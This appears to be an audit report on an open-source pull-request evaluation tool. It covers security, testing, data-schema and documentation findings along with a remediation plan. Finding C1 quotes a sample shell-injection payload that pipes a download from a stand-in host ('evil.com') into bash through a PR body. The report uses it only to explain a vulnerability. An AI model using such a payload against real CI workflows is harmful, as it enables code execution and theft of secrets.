# PR Genius — Comprehensive Audit Report

**Date**: 2026-09-05 | **Version**: 1.8.0 | **Auditor**: 4 parallel sub-agents + synthesis
**Repo**: zsxh1990/pr-genius | **Maturity**: Production tool (OSS, PyPI + GHCR published)

---

## Executive Summary

**Overall Health Grade: B-** — Strong architecture and data quality foundations, but critical gaps in testing, CI enforcement, and code hygiene that compound over time.

| Category | Rating | Summary |
|----------|--------|---------|
| Architecture | B+ | Clean dual-perspective design, zero-dep core, good module separation |
| Security | B- | GraphQL injection, shell injection via PR body, unvalidated subprocess args |
| Testing | D | Core package has tests; CLI/validate/skill have ZERO. No CI test execution |
| Data Quality | B | 296 evidence files all schema-consistent; but dual-schema fragmentation, empty files |
| CI/CD | C+ | Good validation gates; shell injection, disabled OKF validator, no test execution |
| Documentation | B- | Rich docs but version drift everywhere (README 1.4.0 vs actual 1.8.0) |

**Top 3 Risks**:
1. **Shell injection via PR body** in `pr-genius-check.yml` — exploitable TODAY on any PR
2. **Broken `__init__.py` exports** — `from prgenius import load` raises `AttributeError`
3. **Zero test execution in CI** — broken code ships undetected

**Top 3 Opportunities**:
1. Wire pytest into CI + add CLI tests → massive confidence gain with S/M effort
2. Consolidate `skill/pr_genius.py` into core package → eliminate dual maintenance
3. Unify evidence/review-cases schema → enable end-to-end pipeline integrity

---

## 1. Repository Map

**Purpose**: PR evaluation tool — analyzes GitHub PRs against 247 anti-patterns and 705 success patterns, provides coach/triage/status views, ships as CLI + MCP server + GitHub Action + Docker image.

**Tech Stack**: Python 3.9+ (stdlib only), YAML frontmatter knowledge base, GitHub GraphQL/REST API, MCP protocol, PyPI + GHCR packaging.

**Architecture**:
```
prgenius/src/prgenius/   ← Core library (12 modules, zero deps)
  ├── evaluator.py       ← Main analysis engine (470-line god function)
  ├── parser.py          ← Frontmatter + profile parsing
  ├── cli.py             ← CLI entry point (1184 lines, 14 subcommands)
  ├── mcp.py             ← MCP server (12 tools)
  ├── status.py          ← PR health monitoring (1247 lines, 9-state machine)
  ├── triage.py          ← Policy-based PR triage
  ├── contributor_view.py / maintainer_view.py  ← Dual-perspective views
  ├── issue_evaluator.py ← Issue quality scoring (spam detection)
  ├── pr_metadata.py     ← PR diff/label parsing
  └── utils.py           ← Shared utilities

scripts/                 ← Pipeline + operational scripts (25 files)
  ├── run_pipeline.py    ← 4-phase: enrich→features→score→evidence
  ├── harvest.py         ← Daily content harvesting
  ├── heartbeat.py       ← Health monitoring
  └── ...

skill/pr_genius.py       ← Standalone 562-line DUPLICATE of evaluator (for DSH)

anti-patterns/ (247 JSON) + success-patterns/ (705 JSON)  ← Knowledge base
evidence/ (296 JSON) + review-cases/ (302 JSON)            ← Case data (DUAL SCHEMA!)
profiles/ (67 dirs + 4 JSON)                               ← Repo profiles
features/ + predictions/                                    ← ML pipeline outputs
```

**Surprises**:
- `skill/pr_genius.py` is a 562-line copy of `evaluator.py` with its own frontmatter parser
- `evidence/` and `review-cases/` store the same PRs in completely different schemas with different ID schemes
- `__init__.py` exports 5 functions that don't exist — the public API is broken
- 15 empty (0-byte) JSON files in success-patterns

---

## 2. Audit Report

### 2.1 CRITICAL Findings (4)

| # | Finding | Location | Consequence |
|---|---------|----------|-------------|
| C1 | **Shell injection via PR body** | `.github/workflows/pr-genius-check.yml:53-57` | PR body containing `"; curl evil.com \| bash #"` breaks out of double-quoted shell string. Exploitable on ANY external PR. |
| C2 | **`__init__.py` exports undefined names** | `prgenius/src/prgenius/__init__.py:6-21` | `__all__` declares `load`, `iter_profiles`, etc. but none are imported. `from prgenius import load` → `AttributeError`. Public API is broken. |
| C3 | **Case ID mismatch between evidence/ and review-cases/** | `evidence/` uses `case_id: "checkout-2513"`, `review-cases/` uses `id: "actions-checkout-2513"` | Same PR has different IDs in two directories. `generate_evidence.py` joins on `case_id` — orphaned records, silent data loss. |
| C4 | **Zero unit tests for core package in CI** | All `.github/workflows/*.yml` | No workflow runs `pytest`. 15 test files exist but are never executed in CI. Broken code ships undetected. |

### 2.2 HIGH Findings (22)

**Security & Safety (4)**

| # | Finding | Location |
|---|---------|----------|
| H1 | GraphQL string injection via unsanitized `author`/`repo` | `status.py:212-213` — only `"` escaped, not `\` or newlines |
| H2 | Subprocess calls with unvalidated user-controlled args | `cli.py:347-355,533-543,600-614,658-669` |
| H3 | `pull_request_target` with code checkout — safe today but one-line-change from critical | `.github/workflows/pr-genius-check.yml:4-5,20` |
| H4 | `prgenius-core` on PyPI installed without version pin in GHCR image | `.github/workflows/publish-ghcr.yml:19` via `Dockerfile.github_action:19` |

**Architecture & Code (8)**

| # | Finding | Location |
|---|---------|----------|
| H5 | God function `analyze_pr()` — 470 lines, 7 responsibilities | `evaluator.py:469-940` |
| H6 | `skill/pr_genius.py` — 562-line duplicate of evaluator with its own parser | `skill/pr_genius.py:63-349` vs `evaluator.py` |
| H7 | `_ANTI_PATTERN_STOPWORDS` lines 316-337 duplicate 291-315 | `evaluator.py:292-337` |
| H8 | `sync_readme_metrics.py` hardcodes version "1.2.0" (actual: 1.8.0) | `scripts/sync_readme_metrics.py:95` |
| H9 | `parse_diff_stat("")` always called with empty string — diff stats are fictional | `evaluator.py:771` |
| H10 | Bare `except Exception: continue` swallows all errors silently | `evaluator.py:263,285,442,459`, `mcp.py:347`, `status.py:465-493` |
| H11 | 7 modules independently compute `_REPO_ROOT` via fragile `parents[3]` | `evaluator.py:26`, `cli.py:29`, `utils.py:13`, `triage.py:354`, `contributor_view.py:250`, `maintainer_view.py:289`, `mcp.py:22` |
| H12 | `status.py` is 1247 lines — god module with 9+ distinct concerns | `prgenius/src/prgenius/status.py` |

**Data & Pipeline (5)**

| # | Finding | Location |
|---|---------|----------|
| H13 | 15 empty (0-byte) JSON files in success-patterns — will crash `json.load()` | `success-patterns/punkpeye-*.json` and others |
| H14 | 3-tier anti-pattern schema (5/13/21 signal keys) — 29% are "lean" | `anti-patterns/` — 56 files with 5 keys, 24 with 13, 110 with 21 |
| H15 | Dual schema: evidence/ (16 keys) vs review-cases/ (11 keys) for same PRs | `evidence/` and `review-cases/` — same filenames, different structure |
| H16 | No schema validation in 4-phase pipeline | `scripts/run_pipeline.py` chains 4 scripts with no integrity checks |
| H17 | Profiles split: 4 JSON files + 63 MD directories, different parsing paths | `profiles/` — `coach_cases.py` uses regex for MD, JSON unused |

**Testing & CI (5)**

| # | Finding | Location |
|---|---------|----------|
| H18 | `cli.py` (1184 lines) has NO dedicated test file | `prgenius/src/prgenius/cli.py` — 14 subcommands untested |
| H19 | `validate.py` (424 lines) is untested — CI depends on it | Root `validate.py` |
| H20 | `skill/pr_genius.py` (562 lines) has zero tests | `skill/pr_genius.py` |
| H21 | OKF validator disabled with `\|\| true` in CI — prints "passed" regardless | `.github/workflows/validate.yml:93-96` |
| H22 | No test gate before PyPI publish — smoke test only checks `--version` | `.github/workflows/publish-pypi.yml:41-44` |

### 2.3 MEDIUM Findings (33)

<details>
<summary>Click to expand all 33 MEDIUM findings</summary>

**Architecture & Code (8)**

| # | Finding | Location |
|---|---------|----------|
| M1 | Duplicated frontmatter parsing in evaluator (already in parser.py) | `evaluator.py:216-288,395-462` |
| M2 | Module-level mutable caches never invalidated in MCP server | `evaluator.py:213-214` |
| M3 | Hardcoded if/elif rule matching in triage — fragile for new rules | `triage.py:98-175` |
| M4 | `cross_validate.py` sys.path filter uses `or` where `and` needed | `cross_validate.py:27` |
| M5 | Hardcoded Windows path in `fix_legacy_cases.py` | `fix_legacy_cases.py:16` |
| M6 | Inconsistent GitHub API patterns across 4+ scripts (urllib/gh/subprocess) | `scripts/` — 4 different auth/retry strategies |
| M7 | `requires-python >= 3.9` but CI only tests 3.11+ | `prgenius/pyproject.toml:6` |
| M8 | Bare `except:` in `extract_features.py` catches SystemExit | `extract_features.py:103` |

**Security (3)**

| # | Finding | Location |
|---|---------|----------|
| M9 | Webhook POST accepts HTTP URLs — plaintext transmission of PR data | `status.py:1001-1009` |
| M10 | Relative snapshot path writes to unexpected CWD | `status.py:746` |
| M11 | `publish-pypi.yml:60` — `github.ref_name` in shell command | `publish-pypi.yml:60` |

**Data (8)**

| # | Finding | Location |
|---|---------|----------|
| M12 | `created_at` missing in ~29% of anti-patterns and success-patterns | ~50-70 files each |
| M13 | 6 orphaned review-cases without evidence/ counterpart | `review-cases/misakanet-1046.json` etc. |
| M14 | Sentinel value -1.0 for time fields in 54% of features | `features/features.json` |
| M15 | Anti-patterns only 3 categories (rejected/duplicate/already_done) | All `anti-patterns/*.json` |
| M16 | misakanet-50 lessons unstructured — scoring script not implemented | `misakanet-50/SCORING.md:189` |
| M17 | predictions.json (173) vs features.json (268) — 35% gap | `predictions/evaluation.json:2` |
| M18 | Unbounded file growth — 50 cases/day, no retention/archival | `scripts/daily_content_expand.py` |
| M19 | No data retention or versioning policy for knowledge base | All data dirs committed to git |

**Testing & CI (7)**

| # | Finding | Location |
|---|---------|----------|
| M20 | 3 test files test data artifacts not code logic (skip if no data) | `test_enrich_cases.py`, `test_extract_features.py`, `test_score_merge.py` |
| M21 | E2E tests depend on live GitHub API (MisakaNet repo) | `test_smoke_e2e.py:11-73` |
| M22 | No integration tests for full pipeline | `prgenius/tests/` |
| M23 | No dependency vulnerability scanning in CI | All workflows |
| M24 | `Dockerfile:36-43` — `COPY ... \|\| true` silently swallows missing files | `Dockerfile:36-43` |
| M25 | `Dockerfile.github_action` missing profiles/ and lessons — incomplete KB | `Dockerfile.github_action:22-26` |
| M26 | `requirements.txt` declares `pyyaml` but `pyproject.toml` has `dependencies = []` | `requirements.txt:1` vs `pyproject.toml:25` |

**Documentation (7)**

| # | Finding | Location |
|---|---------|----------|
| M27 | README version 1.4.0 vs actual 1.8.0 | `README.md:5` |
| M28 | README says "8 MCP tools" — actual is 12 | `README.md:13` |
| M29 | README Python badge says 3.10+ vs pyproject.toml >=3.9 | `README.md:10` |
| M30 | CONTRIBUTING.md version v0.5.3 (2026-07-02) — 14 releases behind | `CONTRIBUTING.md:215` |
| M31 | `skill/pr_genius.py` not documented anywhere | Root `skill/pr_genius.py` |
| M32 | Bare `except: pass` in validate.py inline Python | `.github/workflows/validate.yml:79` |
| M33 | `policy_freshness.py` 90-day threshold hardcoded, not CLI-overridable | `validate_checks/policy_freshness.py:19` |

</details>

### 2.4 LOW Findings (32)

<details>
<summary>Click to expand all 32 LOW findings</summary>

| # | Finding | Location |
|---|---------|----------|
| L1 | Dead import `PRStatus` in cli.py | `cli.py:554,622` |
| L2 | Dead code in `suggest_profile_writeback()` CI_FAILING branch | `status.py:1183-1188` |
| L3 | `predict_success_rate()` deprecated but still present | `evaluator.py:993-1055` |
| L4 | `import json as _json` redundant aliasing | `cli.py:791,855`, `mcp.py:313`, `skill/pr_genius.py:529` |
| L5 | Heuristic `deleted = max(0, added // 3)` in diff parsing | `pr_metadata.py:116` |
| L6 | `profile_get()` O(n) with no index | `parser.py:220-229` |
| L7 | `rglob("pr-*.md")` matches unintended nested files | `parser.py:209` |
| L8 | `_spam_confidence` score 20 vs dimension weight 15 | `issue_evaluator.py:449` |
| L9 | Duplicated profile-reading in MCP tools | `mcp.py:84-93,137-146` |
| L10 | Snapshot directory defaults to relative path | `status.py:746` |
| L11 | `anti_overfit.py` duplicates payload construction | `scripts/anti_overfit.py:320-348` |
| L12 | `dashboard.py` `load_snapshot()` returns None in JSON path | `scripts/dashboard.py:92-97` |
| L13 | Bare `except:` in `extract_features.py` | `scripts/extract_features.py:103` |
| L14 | Migration scripts `fix_lesson_yaml.py`/`v2` overlap | `scripts/fix_lesson_yaml*.py` |
| L15 | Inconsistent argparse vs manual arg parsing | `coach_cases.py`, `heartbeat.py`, `tool_call_predictor.py` |
| L16 | Hardcoded `/tmp/` output path | `scripts/heartbeat.py:33` |
| L17 | Hardcoded 30-repo list | `scripts/daily_content_expand.py:36-77` |
| L18 | `cross_validate.py` destructive sys.modules manipulation | `scripts/cross_validate.py:30-33` |
| L19 | action.yml uses setup-python@v5 while workflows use @v7 | `.github/actions/pr-genius-check/action.yml:57` |
| L20 | No `.dockerignore` — bloated build context | Repo root |
| L21 | GitHub Action Dockerfile runs as root | `Dockerfile.github_action:12` |
| L22 | Hardcoded profile directory names in Dockerfile | `Dockerfile:37-43` |
| L23 | `regression_test.py` silently drops errors after first 5 | `scripts/regression_test.py:51-53` |
| L24 | Duplicate evaluator tests (test_evaluator.py + test_evaluator_v163.py) | `prgenius/tests/` |
| L25 | `mcp>=1.0` unbounded in Dockerfile | `Dockerfile:29` |
| L26 | No `[tool.pytest.ini_options]` in pyproject.toml | `prgenius/pyproject.toml` |
| L27 | QUALITY_PLAN.md stale vs README | `QUALITY_PLAN.md:11-19` |
| L28 | KNOWN_ISSUES.md version 0.2.0 (2026-07-02) | `KNOWN_ISSUES.md:5-6` |
| L29 | Broken OpenClaw link in CONTRIBUTING.md | `CONTRIBUTING.md:131` |
| L30 | Dead code `table_rows` in validate.py | `validate.py:236-252` |
| L31 | Extra signal keys `is_listing_pr`/`has_glama_badge` only in success-patterns | `success-patterns/` |
| L32 | Redundant per-record weights in predictions.json | `predictions/predictions.json` |

</details>

### 2.5 Strengths (Things Done Well)

1. **Zero runtime dependencies** — `pyproject.toml:dependencies=[]` is excellent supply chain hygiene
2. **Read-only/advisory design** — All MCP tools are read-only, never write to GitHub
3. **Secret detection** — `issue_evaluator.py` covers PAT/Slack/AWS/JWT/private keys
4. **9-state PR health machine** — `status.py` with priority ordering, transitions, alert severity
5. **Dual-perspective views** — contributor vs maintainer cleanly separated
6. **Evidence redaction** — `harvest.py` strips tokens/AWS keys/internal URLs
7. **Non-root Docker user** — main Dockerfile creates `prgenius` user
8. **PyPI Trusted Publisher** — OIDC-based, no long-lived tokens
9. **Docker attestation** — GHCR images include build provenance
10. **Comprehensive validation suite** — 8 checks (frontmatter, links, schema, anti-pattern coverage, evidence, policy freshness, release audit)
11. **Excellent issue_evaluator tests** — 285+ cases, boundary tests, adversarial spam, performance batches
12. **Consistent evidence schema** — 296 files, all 16 fields present in every file
13. **Strong evaluation metrics** — precision 0.913, recall 0.943, F1 0.928
14. **Profile diversity** — 67 repos across AI/ML, DevTools, Infra, Languages, Data

---

## 3. Improvement Strategy

### Theme 1: "CI is decorative, not protective"
**Goal**: Every merge is validated by tests, linting, and security checks. False gates eliminated.
**Principle**: If it's not enforced, it doesn't exist.
**Signals**: `pytest` runs on every PR, shell injection fixed, OKF validator real gate, PyPI publish requires test pass.

### Theme 2: "Dual maintenance creates silent divergence"
**Goal**: Single source of truth for evaluator logic, frontmatter parsing, repo root resolution.
**Principle**: DRY applies to knowledge as much as code.
**Signals**: `skill/pr_genius.py` imports from package or is auto-generated; single `_REPO_ROOT` utility; evaluator uses `parser.parse_frontmatter()`.

### Theme 3: "Data pipeline has no integrity guarantees"
**Goal**: Schema validation at every pipeline boundary; unified case ID scheme; no empty/corrupt files.
**Principle**: Fail fast, not silently corrupt.
**Signals**: Pipeline scripts validate input/output schemas; evidence/ and review-cases/ share one schema; zero empty JSON files.

### Theme 4: "Documentation drifts from reality"
**Goal**: Version, tool count, and Python version in README always match code.
**Principle**: Docs are part of the product.
**Signals**: `sync_readme_metrics.py` pulls version from `pyproject.toml`; README tested in CI.

### What We Explicitly Do NOT Fix (and Why)

| Item | Reason |
|------|--------|
| `status.py` god module split | Effort L-XL, risk HIGH (state machine refactor), ROI moderate at current scale |
| Monolithic features.json | Premature — 268 records is fine, revisit at 5K+ |
| Anti-pattern category expansion | Requires domain research + data re-labeling — separate project |
| Migration script cleanup | One-shot scripts, harmless to leave, deleting risks confusion |

---

## 4. Task Plan

### Milestone 0 — Safety Net (Before Any Refactoring)

| # | Task | Files | Acceptance Criteria | Effort | Risk | Deps |
|---|------|-------|---------------------|--------|------|------|
| T0.1 | **Fix shell injection in pr-genius-check.yml** | `.github/workflows/pr-genius-check.yml` | PR body written to temp file before passing to shell (like action.yml already does) | S | LOW | — |
| T0.2 | **Wire pytest into CI** | `.github/workflows/validate.yml` | `pytest prgenius/tests/ -v` step added, fails build on test failure | S | LOW | — |
| T0.3 | **Fix `__init__.py` exports** | `prgenius/src/prgenius/__init__.py` | Either remove broken `__all__` or actually import the 5 functions | S | LOW | — |
| T0.4 | **Add `.dockerignore`** | `.dockerignore` | Excludes `.git/`, `.venv/`, `evidence/`, `__pycache__/`, `*.pyc` | S | LOW | — |

**Quick Wins** (S effort, high impact): T0.1, T0.2, T0.3, T0.4 — all can be done in <2 hours total.

### Milestone 1 — Critical Fixes

| # | Task | Files | Acceptance Criteria | Effort | Risk | Deps |
|---|------|-------|---------------------|--------|------|------|
| T1.1 | **Fix GraphQL injection in status.py** | `status.py:212-213` | Use parameterized query or proper escaping for `\`, newlines, control chars | S | LOW | — |
| T1.2 | **Delete 15 empty JSON files** | `success-patterns/*.json` | `find success-patterns -empty -delete`; verify `json.load()` no longer crashes | S | LOW | — |
| T1.3 | **Remove OKF validator `|| true`** | `.github/workflows/validate.yml:93-96` | Remove `|| true`, let validator fail the build | S | MEDIUM | T0.2 |
| T1.4 | **Add test gate before PyPI publish** | `.github/workflows/publish-pypi.yml` | `pytest` job must pass before publish job runs | S | LOW | T0.2 |
| T1.5 | **Fix README version drift** | `README.md` | Version=1.8.0, MCP tools=12, Python>=3.9 | S | LOW | — |
| T1.6 | **Fix `sync_readme_metrics.py` version** | `scripts/sync_readme_metrics.py:95` | Read version from `pyproject.toml` instead of hardcoding | S | LOW | — |

**Implementation sketch for T1.1**:
```python
# Instead of:
query = _GRAPHQL_QUERY.replace("SEARCH_QUERY", search_query.replace('"', '\\"'))
# Use:
import json as _json
safe_query = _json.dumps(search_query)  # handles all escaping
query = _GRAPHQL_QUERY.replace("SEARCH_QUERY", safe_query[1:-1])  # strip outer quotes
```

### Milestone 2 — High Leverage (Makes Everything Else Easier)

| # | Task | Files | Acceptance Criteria | Effort | Risk | Deps |
|---|------|-------|---------------------|--------|------|------|
| T2.1 | **Add `test_cli.py` for all 14 subcommands** | `prgenius/tests/test_cli.py` (new) | Each subcommand tested: happy path + `--format json` + exit code | L | LOW | T0.2 |
| T2.2 | **Consolidate `skill/pr_genius.py` to import from package** | `skill/pr_genius.py` | Skill imports `from prgenius.evaluator import analyze_pr` instead of duplicating | M | MEDIUM | T0.3 |
| T2.3 | **Extract `_REPO_ROOT` to utils.py** | `utils.py` + 6 other modules | Single `get_repo_root()` function, all modules import from utils | M | LOW | — |
| T2.4 | **Unify evidence/review-cases schema** | `scripts/enrich_cases.py`, both dirs | Single schema with shared `case_id` field; migration script for existing data | L | MEDIUM | — |
| T2.5 | **Fix `_ANTI_PATTERN_STOPWORDS` duplication** | `evaluator.py:292-337` | Deduplicate lines 316-337 (remove exact duplicates) | S | LOW | — |
| T2.6 | **Add `test_validate.py`** | `prgenius/tests/test_validate.py` (new) | Test `--strict`, `--enforce-evidence`, frontmatter check, orphan check | M | LOW | T0.2 |

**Implementation sketch for T2.1**:
```python
# prgenius/tests/test_cli.py
import subprocess, json, pytest

def run_cli(*args):
    result = subprocess.run(["python3", "-m", "prgenius", *args],
                          capture_output=True, text=True)
    return result

class TestAnalyze:
    def test_version(self):
        r = run_cli("--version")
        assert r.returncode == 0
        assert "prgenius" in r.stdout.lower()

    def test_analyze_json_format(self, tmp_path):
        # Create minimal test fixture
        r = run_cli("analyze", "--format", "json", ...)
        assert r.returncode in (0, 1)
        data = json.loads(r.stdout)
        assert "summary" in data
```

**Implementation sketch for T2.2**:
```python
# skill/pr_genius.py — replace duplicated logic with:
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / "prgenius" / "src"))
from prgenius.evaluator import analyze_pr as _analyze_pr
from prgenius.parser import parse_frontmatter as _parse_frontmatter

def analyze_pr(body, title, ...):
    return _analyze_pr(body, title, ...)
```

### Milestone 3 — Quality & Polish

| # | Task | Files | Acceptance Criteria | Effort | Risk | Deps |
|---|------|-------|---------------------|--------|------|------|
| T3.1 | **Refactor `analyze_pr()` into stages** | `evaluator.py` | Break into 5-6 functions: classify_tier, generate_signals, match_patterns, estimate_merge, build_output | L | MEDIUM | T2.1 |
| T3.2 | **Pin pyyaml in requirements.txt** | `requirements.txt` | `pyyaml>=6.0,<8.0` | S | LOW | — |
| T3.3 | **Add pipeline schema validation** | `scripts/run_pipeline.py` | Each phase validates input schema before processing; fails with clear error | M | LOW | T2.4 |
| T3.4 | **Pin `mcp>=1.0,<3.0` in Dockerfile** | `Dockerfile:29` | Bounded version range | S | LOW | — |
| T3.5 | **Add `.github/workflows/test.yml`** | `.github/workflows/test.yml` (new) | Matrix: Python 3.9/3.11/3.12, runs pytest, uploads coverage | M | LOW | T0.2 |
| T3.6 | **Clean up CONTRIBUTING.md/KNOWN_ISSUES.md versions** | `CONTRIBUTING.md`, `KNOWN_ISSUES.md` | Version fields updated to 1.8.0 | S | LOW | — |
| T3.7 | **Fix `requirements.txt` vs `pyproject.toml` contradiction** | Both files | Decide: either add pyyaml to `[project.dependencies]` or remove from requirements.txt | S | LOW | — |

---

## 5. Open Questions (Need Human Decision)

1. **`skill/pr_genius.py`**: Should it import from the core package (T2.2), remain standalone for DSH compatibility, or be deprecated? DSH may require self-contained files.

2. **Python version support**: `pyproject.toml` says >=3.9, CI tests 3.11+. Do we actually support 3.9/3.10? If not, bump `requires-python` to `>=3.11`.

3. **evidence/ vs review-cases/**: Should we migrate to a single directory (T2.4), or are they intentionally serving different purposes? If intentional, document the distinction.

4. **Anti-pattern category expansion**: The 3-category taxonomy (rejected/duplicate/already_done) limits coaching granularity. Worth expanding to 6-8 categories?

5. **Daily content expansion retention**: At 50 cases/day, the knowledge base will hit 5000+ files in 3 months. Should we implement archival, or is this acceptable?

6. **pyyaml dependency**: Is it truly optional (stdlib-only core) or should it be a proper dependency? The evaluator imports yaml indirectly through parser.py.

---

*Report generated by 4 parallel audit agents + human synthesis. Total findings: 4 CRITICAL, 22 HIGH, 33 MEDIUM, 32 LOW. All findings cite specific file:line references.*
